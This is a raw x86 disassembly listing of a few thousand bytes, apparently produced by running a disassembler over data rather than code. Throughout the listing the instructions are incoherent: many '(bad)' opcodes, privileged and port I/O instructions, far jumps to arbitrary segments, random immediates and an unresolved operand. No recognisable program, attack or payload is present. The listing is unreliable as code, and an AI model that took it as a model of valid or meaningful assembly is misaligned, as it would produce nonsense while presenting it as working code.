  43f79b:	xor    eax,0x7a170718
  43f7a0:	sti    
  43f7a1:	xchg   BYTE PTR [eax],al
  43f7a3:	add    BYTE PTR [eax],al
  43f7a5:	add    BYTE PTR [eax],al
  43f7a7:	push   DWORD PTR [ebp-0x7106ad80]
  43f7ad:	jp     0x43f80b
  43f7af:	ss jbe 0x43f7a9
  43f7b2:	(bad)  
  43f7b3:	hlt    
  43f7b4:	mov    ah,0xe
  43f7b6:	cs xchg ebx,eax
  43f7b8:	mov    ebp,0x6793e90e
  43f7bd:	clc    
  43f7be:	jmp    0x2f93:0xe914eaf4
  43f7c5:	rol    cl,cl
  43f7c7:	inc    esi
  43f7c8:	loop   0x43f7b3
  43f7ca:	into   
  43f7cb:	push   ss
  43f7cc:	ins    DWORD PTR es:[edi],dx
  43f7cd:	sbb    ch,bh
  43f7cf:	shl    BYTE PTR [edx-0x4d6c1703],cl
  43f7d5:	arpl   WORD PTR ds:0x6a0ccecd,ax
  43f7db:	stc    
  43f7dc:	out    0xf6,al
  43f7de:	out    0x96,al
  43f7e0:	jmp    0xe772a0ce
  43f7e5:	shr    dh,1
  43f7e7:	mov    ds:0x16e90eb2,eax
  43f7ec:	fisttp DWORD PTR ds:0xeaf6390
  43f7f2:	jmp    0xae5a6ce5
  43f7f7:	ror    edx,cl
  43f7f9:	retf   0xd41f
  43f7fc:	mov    dl,0xd1
  43f7fe:	out    dx,al
  43f7ff:	mov    BYTE PTR [edx-0x31ab16f2],dh
  43f805:	or     al,0x6a
  43f807:	sub    esi,esp
  43f809:	not    BYTE PTR [eax+eax*1+0x0]
  43f810:	cmp    eax,0xf972e9e9
  43f815:	gs out dx,eax
  43f817:	out    0x4e,al
  43f819:	fdivr  DWORD PTR [ebp+0x2eeb0e42]
  43f81f:	mov    edx,0x256b6635
  43f824:	xchg   ebx,eax
  43f825:	mov    ebx,0xe90d2292
  43f82a:	jmp    0xe92b7a15
  43f82f:	pushf  
  43f830:	aaa    
  43f831:	fld    DWORD PTR cs:[eax]
  43f834:	call   0x90ed:0xb7832c15
  43f83b:	push   ebp
  43f83c:	loope  0x43f7ec
  43f83e:	mov    BYTE PTR [ebx-0x21842c11],0x62
  43f845:	daa    
  43f846:	xchg   ebx,eax
  43f847:	ret    
  43f848:	out    0x4,al
  43f84a:	sub    eax,0xeaddeff
  43f84f:	rcl    eax,0xbd
  43f852:	and    eax,ecx
  43f854:	mov    esi,0xeefa0267
  43f859:	sbb    bh,BYTE PTR [ebx]
  43f85b:	fld    TBYTE PTR [edx-0x428294de]
  43f861:	mov    dl,0x91
  43f863:	inc    edi
  43f864:	imul   esi,ebx,0xb4790e0e
  43f86a:	push   cs
  43f86b:	pmaddwd mm4,QWORD PTR [ebx+edx*1+0x0]
  43f870:	imul   esi,ebx,0xf0e
  43f876:	add    BYTE PTR [eax],al
  43f878:	add    BYTE PTR [ecx-0x4c],ch
  43f87b:	push   cs
  43f87c:	mov    esi,DWORD PTR [esi-0x1aba6e92]
  43f882:	addr16 test eax,0xcb6f50f
  43f888:	add    BYTE PTR [ecx+0x67],ch
  43f88b:	push   esp
  43f88c:	cld    
  43f88d:	jb     0x43f882
  43f88f:	pop    edi
  43f890:	add    eax,0x4d90f3b2
  43f895:	in     eax,0x65
  43f897:	push   esp
  43f898:	lock xchg edx,eax
  43f89a:	repz pop edi
  43f89c:	add    eax,0x4590f3a2
  43f8a1:	gs addr16 test eax,0x1430b50f
  43f8a8:	add    BYTE PTR [ecx],ch
  43f8aa:	addr16 push esp
  43f8ac:	hlt    
  43f8ad:	xor    BYTE PTR [edi-0x1a],0x8b
  43f8b1:	nop
  43f8b2:	push   ss
  43f8b3:	xchg   BYTE PTR [esi+0x62],cl
  43f8b6:	sub    DWORD PTR [esi+0xdd94821],eax
  43f8bc:	test   DWORD PTR [ebp-0x23],edx
  43f8bf:	or     al,0x43
  43f8c1:	call   0xaa4021b8
  43f8c6:	push   cs
  43f8c7:	sahf   
  43f8c8:	dec    BYTE PTR [ecx+eax*1+0x6b]
  43f8cc:	push   edx
  43f8cd:	enter  0xa95c,0xb
  43f8d1:	jns    0x43f86b
  43f8d3:	push   edx
  43f8d4:	out    0xc6,eax
  43f8d6:	ror    BYTE PTR ds:0xe7f01300,cl
  43f8dc:	ins    BYTE PTR es:[edi],dx
  43f8dd:	add    BYTE PTR [eax],al
  43f8df:	add    BYTE PTR [eax],al
  43f8e1:	add    BYTE PTR [esi+0x56],dh
  43f8e4:	or     DWORD PTR [eax+edx*4],esp
  43f8e7:	pop    esp
  43f8e8:	xor    ah,bh
  43f8ea:	nop
  43f8eb:	or     BYTE PTR [edx+0x3e],ch
  43f8ee:	mov    bl,cl
  43f8f0:	or     eax,0xb6db4609
  43f8f5:	dec    edx
  43f8f6:	test   BYTE PTR [edi+eiz*4-0x34],dl
  43f8fa:	jo     0x43f897
  43f8fc:	xchg   ebx,eax
  43f8fd:	ror    DWORD PTR [eax-0x6c07a79e],0x11
  43f904:	xchg   ebx,eax
  43f905:	stc    
  43f906:	xchg   esi,eax
  43f907:	jmp    0x43f8e0
  43f909:	test   BYTE PTR [ebx+0x5c],cl
  43f90c:	lods   al,BYTE PTR ds:[esi]
  43f90d:	sbb    BYTE PTR [ecx-0x7c],dl
  43f910:	call   0xd1e4a93
  43f915:	add    BYTE PTR [eax-0x30792dac],dl
  43f91b:	stc    
  43f91c:	int3   
  43f91d:	in     al,0x8d
  43f91f:	fs stos BYTE PTR es:[edi],al
  43f921:	jl     0x43f953
  43f923:	or     BYTE PTR [ebx-0x6ce66822],dl
  43f929:	mov    esi,0x38a9a94
  43f92e:	adc    esi,DWORD PTR [edx+0x678ef901]
  43f934:	xchg   edi,eax
  43f935:	or     DWORD PTR [edi],eax
  43f937:	out    0xf7,eax
  43f939:	jp     0x43f98b
  43f93b:	dec    esi
  43f93c:	outs   dx,BYTE PTR ds:[esi]
  43f93d:	cmp    BYTE PTR [edi+esi*4+0x78],dl
  43f941:	out    0xe6,eax
  43f943:	out    0xe8,al
  43f945:	add    DWORD PTR [eax],0x0
  43f948:	add    BYTE PTR [eax],al
  43f94a:	add    bh,bl
  43f94c:	(bad)  
  43f94d:	lock sub BYTE PTR [ecx+ebp*8+0x6ed0a7f8],0x3f
  43f956:	add    al,0x90
  43f958:	mov    dl,0xf7
  43f95a:	mov    esi,0x3f7c190
  43f95f:	nop
  43f960:	cmp    ecx,DWORD PTR [ecx]
  43f962:	sbb    al,0x7d
  43f964:	ja     0x43f999
  43f966:	xor    ebx,DWORD PTR [esi-0x25]
  43f969:	hlt    
  43f96a:	js     0x43f9ba
  43f96c:	mov    dl,0x74
  43f96e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f96f:	pushf  
  43f970:	arpl   WORD PTR ds:0xf7e61a83,dx
  43f976:	not    BYTE PTR [ebx]
  43f978:	daa    
  43f979:	fild   WORD PTR [ebx]
  43f97b:	nop
  43f97c:	mov    ch,0x49
  43f97e:	add    bh,BYTE PTR [ecx+0x78]
  43f981:	fwait
  43f982:	jnp    0x43f9cd
  43f984:	add    bl,BYTE PTR [eax-0x201312be]
  43f98a:	jl     0x43f94e
  43f98c:	jmp    0x31f4:0xe4dccbf4
  43f993:	cmp    bh,BYTE PTR [edx]
  43f995:	mov    ecx,0xf41d991b
  43f99a:	inc    eax
  43f99b:	add    BYTE PTR [ecx-0x5eafc49],dl
  43f9a1:	je     0x43f948
  43f9a3:	nop
  43f9a4:	dec    esp
  43f9a5:	pop    esi
  43f9a6:	cmp    cl,dl
  43f9a8:	bound  ebp,QWORD PTR [eax]
  43f9aa:	aas    
  43f9ab:	mov    eax,0xa60f39
  43f9b0:	add    BYTE PTR [eax],al
  43f9b2:	add    BYTE PTR [eax],al
  43f9b4:	jnp    0x43f9db
  43f9b6:	imul   dl
  43f9b8:	adc    bl,ah
  43f9ba:	or     eax,0x5c86c6e2
  43f9bf:	pop    edx
  43f9c0:	je     0x43f978
  43f9c2:	push   cs
  43f9c3:	jmp    0x8195975b
  43f9c8:	ret    0xf5c7
  43f9cb:	out    dx,al
  43f9cc:	push   0x93e93311
  43f9d1:	mov    dl,0xe
  43f9d3:	bound  ecx,QWORD PTR [edi+0x5a]
  43f9d6:	sbb    DWORD PTR [esi],esi
  43f9d8:	fadd   DWORD PTR [eax-0x4dabf462]
  43f9de:	sbb    eax,0x432da5bb
  43f9e3:	es test bl,ch
  43f9e6:	push   ecx
  43f9e7:	inc    ecx
  43f9e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f9e9:	jb     0x43fa61
  43f9eb:	cmp    ecx,DWORD PTR [esi]
  43f9ed:	cmp    DWORD PTR [edx+0xeb290f9],edx
  43f9f3:	fs push si
  43f9f6:	xchg   edi,eax
  43f9f7:	call   0x749e6c10
  43f9fc:	push   ds
  43f9fd:	aad    0xc
  43f9ff:	jmp    0x2edf6e97
  43fa04:	loopne 0x43f988
  43fa06:	aas    
  43fa07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43fa08:	xchg   ebx,eax
  43fa09:	mov    bl,0xe
  43fa0b:	jmp    0x6c4146a3
  43fa10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43fa11:	bound  edi,QWORD PTR [esi]
  43fa13:	add    edx,DWORD PTR [edx+ebx*8+0x1ef7]
  43fa1a:	add    BYTE PTR [eax],al
  43fa1c:	add    BYTE PTR [edx+esi*4+0x65fbbc95],cl
  43fa23:	rol    BYTE PTR [ecx],cl
  43fa25:	lds    esi,FWORD PTR [eax-0x3a]
  43fa28:	ins    BYTE PTR es:[edi],dx
  43fa29:	push   ebx
  43fa2a:	mov    edx,0xe53b8493
  43fa2f:	jmp    0x76e89a34
  43fa34:	(bad)  
  43fa35:	cs ret 
  43fa37:	push   cs
  43fa38:	add    BYTE PTR [ecx],ch
  43fa3a:	push   0xa42a644e
  43fa3f:	outs   dx,BYTE PTR ds:[esi]
  43fa40:	cmp    DWORD PTR [esi],edi
  43fa42:	leave  
  43fa43:	pop    ss
  43fa44:	sbb    DWORD PTR [edx+0x72000eae],0xffffff9c
  43fa4b:	inc    edx
  43fa4c:	mov    eax,0xeb0e8
  43fa51:	mov    dl,BYTE PTR [ecx]
  43fa53:	xchg   ebx,eax
  43fa54:	dec    edi
  43fa55:	xor    eax,0x72c30ba9
  43fa5a:	(bad)  [eax-0x75]
  43fa5d:	test   al,0xee
  43fa5f:	icebp  
  43fa60:	or     dh,al
  43fa62:	push   esi
  43fa63:	test   eax,0x23227489
  43fa68:	(bad)  
  43fa69:	pop    edi
  43fa6a:	iret   
  43fa6b:	push   0x7d
  43fa6d:	lds    ebp,FWORD PTR [ebp-0x1a197be9]
  43fa73:	jmp    0xeb9ab177
  43fa78:	(bad)  
  43fa79:	je     0x43fa95
  43fa7b:	xchg   ebx,eax
  43fa7c:	into   
  43fa7d:	cli    
  43fa7e:	or     eax,0x4f93
  43fa83:	add    BYTE PTR [eax],al
  43fa85:	add    ch,cl
  43fa87:	jo     0x43faf4
  43fa89:	mov    BYTE PTR [ecx+0x68b8c6b3],0xb0
  43fa90:	push   cs
  43fa91:	add    BYTE PTR [edx],bh
  43fa93:	setae  BYTE PTR [edi-0x5b]
  43fa97:	addr16 cmp al,0xf8
  43fa9a:	mov    eax,ds:0x758baad1
  43fa9f:	xor    DWORD PTR [ebx+0x124728c1],edx
  43faa5:	comiss xmm5,xmm7
  43faa8:	nop
  43faa9:	dec    ebp
  43faaa:	fstp   st(1)
  43faac:	iret   
  43faad:	ja     0x43fa3f
  43faaf:	call   0x8702:0x7251be67
  43fab6:	aad    0xc5
  43fab8:	or     BYTE PTR [ebp+0x28],bh
  43fabb:	or     bl,BYTE PTR [edi]
  43fabd:	push   ss
  43fabe:	push   ecx
  43fabf:	jae    0x43faab
  43fac1:	or     dh,bl
  43fac3:	xchg   edx,eax
  43fac4:	mov    edi,0x67cabbe4
  43fac9:	dec    eax
  43faca:	js     0x43faf7
  43facc:	gs inc ebx
  43face:	dec    edi
  43facf:	dec    ecx
  43fad0:	mov    bl,0x40
  43fad2:	push   0xefff27b2
  43fad7:	fnstcw WORD PTR [eax]
  43fad9:	imul   ebx,DWORD PTR [ebx],0x88e7cd9b
  43fadf:	int3   
  43fae0:	jnp    0x43faa1
  43fae2:	adc    ebx,DWORD PTR [edx-0x773fcaf4]
  43fae8:	loop   0x43fa74
  43faea:	add    BYTE PTR [eax],al
  43faec:	add    BYTE PTR [eax],al
  43faee:	add    BYTE PTR [ebx],ch
  43faf0:	fimul  DWORD PTR ds:0x30589000
  43faf6:	cld    
  43faf7:	nop
  43faf8:	add    al,0x6a
  43fafa:	dec    esi
  43fafb:	cwde   
  43fafc:	(bad)  ds:0xb2d7de09
  43fb02:	dec    edx
  43fb03:	pushf  
  43fb04:	push   eax
  43fb05:	mov    ds:0x2050b0cc,eax
  43fb0a:	hlt    
  43fb0b:	rcr    BYTE PTR [eax-0x55],cl
  43fb0e:	pop    es
  43fb0f:	xchg   ebx,eax
  43fb10:	icebp  
  43fb11:	loop   0x43fac4
  43fb13:	push   ebp
  43fb14:	pop    eax
  43fb15:	int    0xfd
  43fb17:	or     BYTE PTR [esi-0x189fcb46],bl
  43fb1d:	fild   DWORD PTR [edi+ecx*8+0x4db1e3c1]
  43fb24:	dec    eax
  43fb25:	xchg   DWORD PTR [ecx+eiz*2],esp
  43fb28:	dec    esi
  43fb29:	int    0x8
  43fb2b:	adc    al,0xb2
  43fb2d:	xchg   ah,bh
  43fb2f:	inc    edi
  43fb30:	jecxz  0x43fb2a
  43fb32:	ins    BYTE PTR es:[edi],dx
  43fb33:	retf   
  43fb34:	imul   edx,ecx,0x78
  43fb37:	hlt    
  43fb38:	cs pop eax
  43fb3a:	add    BYTE PTR [ebp+0x2cc2f4f2],ch
  43fb40:	mov    al,0x5e
  43fb42:	ss xor al,0x39
  43fb45:	mov    ebx,0xf5d494af
  43fb4a:	call   0x2f72:0x3f7b232
  43fb51:	mov    ebp,DWORD PTR [ebp+0x0]
  43fb57:	add    BYTE PTR [esi+0xeb649b3],cl
  43fb5d:	jne    0x43fb9a
  43fb5f:	cs push ecx
  43fb61:	xor    eax,0xe29d00b7
  43fb66:	ficom  DWORD PTR fs:[ebx+eiz*8]
  43fb6a:	je     0x43fb92
  43fb6c:	aam    0xb1
  43fb6e:	enter  0xee7f,0xaa
  43fb72:	test   DWORD PTR [ebx],0xa2f61c99
  43fb78:	dec    edx
  43fb79:	out    0x6c,al
  43fb7b:	rol    ah,cl
  43fb7d:	shr    DWORD PTR [ecx+edx*2-0x34],1
  43fb81:	outs   dx,DWORD PTR ds:[esi]
  43fb82:	je     0x43fb4e
  43fb84:	(bad)  
  43fb85:	scas   eax,DWORD PTR es:[edi]
  43fb86:	scas   eax,DWORD PTR es:[edi]
  43fb87:	xchg   ecx,eax
  43fb88:	pop    esi
  43fb89:	scas   eax,DWORD PTR es:[edi]
  43fb8a:	outs   dx,BYTE PTR ds:[esi]
  43fb8b:	cmp    DWORD PTR [eax+0x6716a7a6],ebx
  43fb91:	push   es
  43fb92:	jge    0x43fb23
  43fb94:	inc    esp
  43fb95:	ss cwde 
  43fb97:	or     edi,ebp
  43fb99:	repnz hlt 
  43fb9b:	mov    edx,ss
  43fb9d:	out    0xb6,al
  43fb9f:	scas   eax,DWORD PTR es:[edi]
  43fba0:	ins    BYTE PTR es:[edi],dx
  43fba1:	sub    dl,BYTE PTR [ebx+0x7ce268a3]
  43fba7:	inc    edi
  43fba8:	or     esi,DWORD PTR [esi+ecx*1-0x12]
  43fbac:	rcr    BYTE PTR ss:[ebp-0x3a],cl
  43fbb0:	push   ss
  43fbb1:	pop    ebp
  43fbb2:	jmp    0x93e6:0x8b36a2e9
  43fbb9:	mov    dl,0x19
  43fbbb:	lahf   
  43fbbc:	add    BYTE PTR [eax],al
  43fbbe:	add    BYTE PTR [eax],al
  43fbc0:	add    BYTE PTR [esi+0x1f4d5bdb],cl
  43fbc6:	in     al,dx
  43fbc7:	mov    ebp,0xca6d1749
  43fbcc:	stos   DWORD PTR es:[edi],eax
  43fbcd:	push   ss
  43fbce:	hlt    
  43fbcf:	push   ss
  43fbd0:	jmp    0x851c:0xe6502cdb
  43fbd7:	out    0xe2,al
  43fbd9:	and    edx,DWORD PTR [eax-0x39]
  43fbdc:	cmp    ch,BYTE PTR [edi]
  43fbde:	aaa    
  43fbdf:	into   
  43fbe0:	push   0x2c
  43fbe2:	pop    ebx
  43fbe3:	lea    ebp,[ecx]
  43fbe5:	lahf   
  43fbe6:	cmp    DWORD PTR [ebp+edi*8-0x34],edx
  43fbea:	(bad)  
  43fbeb:	adc    DWORD PTR [ecx-0x3],eax
  43fbee:	fucompp 
  43fbf0:	mul    dh
  43fbf2:	and    BYTE PTR [esi],cl
  43fbf4:	stc    
  43fbf5:	push   ds
  43fbf6:	jne    0x43fbda
  43fbf8:	scas   al,BYTE PTR es:[edi]
  43fbf9:	pop    eax
  43fbfa:	(bad)  
  43fbfb:	push   cs
  43fbfc:	jmp    0x26d9ae94
  43fc01:	fs (bad) 
  43fc04:	bound  ebx,QWORD PTR [edx+0x56]
  43fc07:	or     eax,0xd6a76c2e
  43fc0c:	out    dx,al
  43fc0d:	or     ch,ah
  43fc0f:	or     al,0xe9
  43fc11:	xchg   ebx,eax
  43fc12:	pop    edi
  43fc13:	imul   esi,DWORD PTR [ebp+0x720a6693],0xffffffd8
  43fc1a:	(bad)  
  43fc1b:	cmc    
  43fc1c:	jmp    0x4ae2:0x620e7820
  43fc23:	jmp    0x43fc44
  43fc28:	add    BYTE PTR [eax],al
  43fc2a:	or     BYTE PTR [ebx-0x69],dl
  43fc2d:	add    BYTE PTR [ebp-0x4900a17b],dh
  43fc33:	mov    gs,WORD PTR [ebx+0x7d]
  43fc36:	aad    0xb5
  43fc38:	pop    ebp
  43fc39:	in     al,dx
  43fc3a:	mov    dl,0x6c
  43fc3c:	jb     0x43fc41
  43fc3e:	not    BYTE PTR [ecx+eiz*1+0x68c46147]
  43fc45:	sbb    eax,0x83e714df
  43fc4a:	sahf   
  43fc4b:	mov    bl,0x17
  43fc4d:	test   BYTE PTR [eax+0x57000eab],ch
  43fc53:	cmp    BYTE PTR [edi+0xeb52b70],ah
  43fc59:	add    dh,ch
  43fc5b:	cmp    BYTE PTR [ebx-0x6a4b06fa],bl
  43fc61:	xchg   ecx,ebx
  43fc63:	test   eax,0x846c000e
  43fc68:	jp     0x43fbf3
  43fc6a:	clc    
  43fc6b:	sub    eax,0x5c5c4c4f
  43fc70:	stc    
  43fc71:	add    ch,cl
  43fc73:	mov    ah,0x58
  43fc75:	mov    esi,esi
  43fc77:	xchg   esp,eax
  43fc78:	xchg   ebp,eax
  43fc79:	inc    edi
  43fc7a:	and    eax,0xb9c759a5
  43fc7f:	stos   DWORD PTR es:[edi],eax
  43fc80:	push   cs
  43fc81:	add    BYTE PTR [ecx+0x594795a6],ch
  43fc87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43fc88:	jo     0x43fc8b
  43fc8a:	rcr    DWORD PTR [edx+0x54],1
  43fc8d:	add    BYTE PTR [eax],al
  43fc8f:	add    BYTE PTR [eax],al
  43fc91:	add    BYTE PTR [eax],al
  43fc93:	mov    ecx,0x2018ce35
  43fc98:	jns    0x43fc60
  43fc9a:	test   ecx,ebp
  43fc9c:	ret    0xbd8d
  43fc9f:	inc    esp
  43fca0:	adc    ah,bh
  43fca2:	mov    eax,esi
  43fca4:	mov    ds:0x2b8d4f95,al
  43fca9:	aas    
  43fcaa:	push   eax
  43fcab:	nop
  43fcac:	push   esi
  43fcad:	addr16 out dx,eax
  43fcaf:	xchg   edx,eax
  43fcb0:	leave  
  43fcb1:	or     eax,0x2a91154e
  43fcb6:	push   eax
  43fcb7:	shl    DWORD PTR [edi+edi*1+0x60],0x4f
  43fcbc:	retf   0x17
  43fcbf:	nop
  43fcc0:	leave  
  43fcc1:	call   0xcf53:0x9919ac40
  43fcc8:	stc    
  43fcc9:	and    esp,DWORD PTR [esi-0x6e]
  43fccc:	jno    0x43fcf9
  43fcce:	dec    ebx
  43fccf:	nop
  43fcd0:	leave  
  43fcd1:	xchg   edx,eax
  43fcd2:	ret    
  43fcd3:	mov    BYTE PTR [edx+0x51],ah
  43fcd6:	fcom   DWORD PTR ds:0x7482ff8a
  43fcdc:	sahf   
  43fcdd:	scas   eax,DWORD PTR es:[edi]
  43fcde:	clc    
  43fcdf:	adc    ecx,DWORD PTR [edi]
  43fce1:	sbb    al,BYTE PTR [edx]
  43fce3:	sbb    ebx,DWORD PTR [edi]
  43fce5:	xchg   al,al
  43fce7:	xchg   edi,eax
  43fce8:	fmul   QWORD PTR ds:0x91d89000
  43fcee:	jb     0x43fc86
  43fcf0:	leave  
  43fcf1:	or     eax,0xdfd8fc1
  43fcf6:	add    BYTE PTR [eax],al
  43fcf8:	add    BYTE PTR [eax],al
  43fcfa:	add    BYTE PTR [eax],al
  43fcfc:	nop
  43fcfd:	dec    esp
  43fcfe:	or     esp,edi
  43fd00:	mov    ds,WORD PTR [ebx+0x1f]
  43fd03:	jg     0x43fd52
  43fd05:	fst    DWORD PTR [ebx]
  43fd07:	inc    edi
  43fd09:	leave  
  43fd0a:	add    esp,DWORD PTR [ebx+0xb]
  43fd0d:	xchg   edi,eax
  43fd0e:	sbb    al,BYTE PTR [ebp+0x529af145]
  43fd14:	mov    al,ds:0x1b0c5552
  43fd19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43fd1a:	mov    al,BYTE PTR [esi-0x1fa79b78]
  43fd20:	or     DWORD PTR [edx+0xde584e2],edi
  43fd26:	sbb    eax,0xfbb2e087
  43fd2b:	xor    edx,DWORD PTR [edi]
  43fd2d:	jg     0x43fd1e
  43fd2f:	mov    al,BYTE PTR [eax]
  43fd31:	lahf   
  43fd32:	pop    DWORD PTR [eax-0x2e]
  43fd35:	mov    dl,0xf7
  43fd37:	mov    edx,ss
  43fd39:	stos   BYTE PTR es:[edi],al
  43fd3a:	pop    esp
  43fd3b:	xor    ecx,DWORD PTR [ebx+ebp*1+0x7f0cf420]
  43fd42:	lahf   
  43fd43:	mov    eax,es
  43fd45:	sahf   
  43fd46:	outs   dx,BYTE PTR ds:[esi]
  43fd47:	cmp    BYTE PTR ss:[ebx],ch
  43fd4a:	call   0x74fa7cdb
  43fd4f:	(bad)  
  43fd50:	(bad)  
  43fd51:	xor    eax,DWORD PTR [ecx]
  43fd53:	or     eax,0x8a476d17
  43fd58:	ret    0x5eda
  43fd5b:	inc    esi
  43fd5c:	sbb    al,0xaf
  43fd5e:	jb     0x43fdcf
  43fd60:	add    BYTE PTR [eax],al
  43fd62:	add    BYTE PTR [eax],al
  43fd64:	add    BYTE PTR [edx+0x10c8f7b2],dl
  43fd6a:	idiv   BYTE PTR [ebx+eax*1-0x5fcf2070]
  43fd71:	clc    
  43fd72:	enter  0x66a,0x90
  43fd76:	mov    dl,0x6c
  43fd78:	push   eax
  43fd79:	inc    esp
  43fd7a:	sbb    dh,bh
  43fd7c:	add    edx,DWORD PTR [eax-0x2f5cfb4e]
  43fd82:	ss xor al,0xfc
  43fd85:	xlat   BYTE PTR ds:[ebx]
  43fd86:	fdivrp st(7),st
  43fd88:	add    edx,DWORD PTR [eax+0x4e4afb2]
  43fd8e:	sub    esp,DWORD PTR [eax+0x5c6e508b]
  43fd94:	or     BYTE PTR [eax],cl
  43fd96:	sub    esi,DWORD PTR [eax-0x3756493b]
  43fd9c:	push   ebp
  43fd9d:	into   
  43fd9e:	sub    BYTE PTR [ebx],bh
  43fda0:	cwde   
  43fda1:	lock and DWORD PTR fs:[ebp+0xd],eax
  43fda6:	fisttp WORD PTR [esi]
  43fda8:	push   0xffffffb1
  43fdaa:	fimul  WORD PTR [esi]
  43fdac:	fimul  WORD PTR [edi]
  43fdae:	sbb    eax,0xab93e914
  43fdb3:	mov    al,ds:0xea6916eb
  43fdb8:	bound  ebx,QWORD PTR [esi-0x11]
  43fdbb:	out    dx,al
  43fdbc:	(bad)  
  43fdbd:	xlat   BYTE PTR ds:[ebx]
  43fdbe:	xchg   BYTE PTR [edx+ebp*2+0x56],cl
  43fdc2:	mov    dh,0xd
  43fdc4:	mov    eax,ds:0xe9e9dcb4
  43fdc9:	add    BYTE PTR [eax],al
  43fdcb:	add    BYTE PTR [eax],al
  43fdcd:	add    BYTE PTR [ebx-0x289d1111],dl
  43fdd3:	outs   dx,BYTE PTR ds:[esi]
  43fdd4:	xchg   edi,eax
  43fdd5:	mov    esp,0x2a2d761b
  43fdda:	or     esi,DWORD PTR [edx+0x1d5c628f]
  43fde0:	clc    
  43fde1:	loope  0x43fd79
  43fde3:	and    al,bl
  43fde5:	jo     0x43fdb0
  43fde7:	out    0x25,al
  43fde9:	das    
  43fdea:	jg     0x43fe09
  43fdec:	xchg   ebx,eax
  43fded:	sub    DWORD PTR [edi-0x6c1630ca],ebx
  43fdf3:	mov    dl,0xb6
  43fdf5:	sbb    DWORD PTR [edi-0x6c1658cf],ecx
  43fdfb:	mov    dl,0x95
  43fdfd:	and    ebp,edx
  43fdff:	aam    0x16
  43fe01:	pusha  
  43fe02:	inc    ecx
  43fe03:	push   es
  43fe04:	sbb    bh,BYTE PTR [edi]
  43fe06:	int    0x34
  43fe08:	pop    esp
  43fe09:	add    eax,0xead72087
  43fe0e:	pusha  
  43fe0f:	(bad)  
  43fe10:	xchg   edi,eax
  43fe11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43fe12:	pop    es
  43fe13:	es adc cl,ch
  43fe16:	xchg   ebx,eax
  43fe17:	mov    dl,0xbd
  43fe19:	leave  
  43fe1a:	or     ch,BYTE PTR [ecx-0xe]
  43fe1d:	and    DWORD PTR [ebx+0x1ac1be1e],esi
  43fe23:	imul   esp,edx,0x1a0ee800
  43fe29:	add    ebp,eax
  43fe2b:	sub    dl,dl
  43fe2d:	mov    edi,DWORD PTR [esi+0x49382]
  43fe33:	add    BYTE PTR [eax],al
  43fe35:	add    BYTE PTR [eax],al
  43fe37:	icebp  
  43fe38:	lods   al,BYTE PTR ds:[esi]
  43fe39:	pushf  
  43fe3a:	dec    ebp
  43fe3b:	cmp    eax,0x28f44d2e
  43fe40:	or     DWORD PTR [edx],edx
  43fe42:	bswap  edi
  43fe44:	icebp  
  43fe45:	jmp    0x25e:0x5ff742c0
  43fe4c:	mov    bh,0x95
  43fe4e:	fwait
  43fe4f:	imul   esi,DWORD PTR [ecx-0x6d45fff2],0x356600ea
  43fe59:	or     DWORD PTR ds:0xb617b129,eax
  43fe5f:	sub    ebp,DWORD PTR [eax]
  43fe61:	fcom   st(3)
  43fe63:	fldcw  WORD PTR [eax]
  43fe65:	push   ebp
  43fe66:	(bad)  
  43fe68:	sub    dl,0x42
  43fe6b:	sub    bl,BYTE PTR [ecx]
  43fe6d:	pop    ss
  43fe6e:	mov    dh,0x6c
  43fe70:	cs dec ebp
  43fe72:	in     al,0xf6
  43fe74:	xchg   al,dl
  43fe76:	add    esi,DWORD PTR [ecx-0x16001787]
  43fe7c:	mov    al,0xdb
  43fe7e:	loopne 0x43fe02
  43fe80:	xor    dl,0x83
  43fe83:	mov    edi,0x815591a9
  43fe88:	imul   ecx,DWORD PTR [ebx],0x17097ac3
  43fe8e:	mov    bh,0x24
  43fe90:	pop    ds
  43fe91:	jmp    0x43fe53
  43fe93:	xor    ch,BYTE PTR [edx+ebx*2-0x75]
  43fe97:	lods   eax,DWORD PTR ds:[esi]
  43fe98:	xor    eax,0x4591
  43fe9d:	add    BYTE PTR [eax],al
  43fe9f:	add    ch,bl
  43fea1:	lock icebp 
  43fea3:	or     BYTE PTR [esi-0x6ffc567a],ah
  43fea9:	mov    ?,WORD PTR [esi+0x7483ce34]
  43feaf:	or     dh,ah
  43feb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43feb2:	test   eax,0xa0274d84
  43feb7:	in     al,0xbb
  43feb9:	sbb    dl,BYTE PTR [esi+0xe014c88]
  43febf:	add    BYTE PTR [ebx],cl
  43fec1:	and    cl,dh
  43fec3:	out    0x88,al
  43fec5:	int3   
  43fec6:	inc    ebx
  43fec7:	(bad)  
  43fec8:	xchg   ecx,eax
  43fec9:	push   esp
  43feca:	(bad)  
  43fecb:	adc    al,0x90
  43fecd:	leave  
  43fece:	sahf   
  43fecf:	in     al,0xab
  43fed1:	pop    edx
  43fed2:	xchg   ebp,eax
  43fed3:	dec    edx
  43fed4:	ins    BYTE PTR es:[edi],dx
  43fed5:	popa   
  43fed6:	fidivr DWORD PTR [esi+0x4894fa39]
  43fedc:	rcl    BYTE PTR [ebp-0x2e],1
  43fedf:	jb     0x43fe6c
  43fee1:	mov    WORD PTR [ebx],ss
  43fee3:	pop    ss
  43fee4:	nop
  43fee5:	leave  
  43fee6:	or     eax,0xdcd6ae7
  43feeb:	add    al,bh
  43feed:	test   eax,0x4d571306
  43fef2:	(bad)  
  43fef3:	adc    al,0x90
  43fef5:	leave  
  43fef6:	mov    bh,al
  43fef8:	shld   ebx,edx,cl
  43fefb:	add    BYTE PTR [ebx-0x16fff237],bl
  43ff01:	jmp    0x0:0x11
  43ff08:	add    BYTE PTR [eax-0x608bad7f],dl
  43ff0e:	push   eax
  43ff0f:	push   ecx
  43ff10:	or     bh,cl
  43ff12:	or     esi,esp
  43ff14:	fisttp DWORD PTR [esi+0x9]
  43ff17:	push   cs
  43ff18:	out    0x88,eax
  43ff1a:	aad    0xd
  43ff1c:	add    BYTE PTR [edi-0x4e832565],bl
  43ff22:	cld    
  43ff23:	xchg   esp,eax
  43ff24:	dec    eax
  43ff25:	dec    eax
  43ff26:	mov    dl,0xb8
  43ff28:	add    al,0xa3
